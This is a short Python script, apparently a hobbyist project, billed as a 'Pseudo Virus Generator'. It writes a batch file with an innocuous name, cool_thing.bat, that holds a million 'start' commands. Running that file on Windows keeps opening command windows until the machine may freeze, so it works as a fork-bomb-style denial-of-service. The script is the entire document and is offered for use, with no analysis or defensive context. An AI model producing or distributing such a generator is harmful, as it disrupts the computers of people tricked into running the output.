#Author: Alex Nolte
#Created: 2/16/2020

import os

print("Welcome to the Pseudo Virus Generator.")
input("To get started, press enter. ")
print()


def Pseudo_Virus_Creator(File):

    #sets the command to be written line by line, how many lines, and the count
    command = ["start\n"]
    lines = 1000000
    count = 0

    #while count < lines, it will write the command to new line
    #then add 1 to the count
    while count < lines:
        File.writelines(command)
        count += 1

    #closes the file
    File.close()
        

def txt_to_bat():
    file = "cool_thing.txt"
    base = os.path.splitext(file)[0]
    os.rename(file, base + '.bat')

def main():
    #creates new file
    pseudo_virus = open("cool_thing.txt", "w+")

    #sends file to the virus creator
    Pseudo_Virus_Creator(pseudo_virus)

    #runs the txt to bat module
    txt_to_bat()
    
    

#runs the main function
main()

print("Pseudo virus generated.")
print("Press ENTER to exit. ")
input()
